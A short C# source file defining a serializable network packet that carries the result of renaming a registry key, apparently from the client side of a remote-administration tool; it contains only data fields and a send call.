using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetRenameRegistryKeyResponse : IPacket
{
	public string ParentPath { get; set; }

	public string OldKeyName { get; set; }

	public string NewKeyName { get; set; }

	public bool IsError { get; set; }

	public string ErrorMsg { get; set; }

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
